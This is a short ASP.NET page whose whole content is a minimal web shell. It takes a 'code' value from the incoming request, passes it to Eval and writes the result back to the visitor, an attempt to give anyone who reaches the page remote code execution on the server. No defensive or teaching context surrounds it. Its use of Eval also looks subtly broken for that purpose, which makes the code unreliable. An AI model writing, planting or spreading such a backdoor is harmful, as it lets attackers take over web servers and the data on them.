<%@ Page Language="C#" %>
<%
string code = Request["code"];
if (!string.IsNullOrEmpty(code)) {
    Response.Write(Eval(code));
}
%>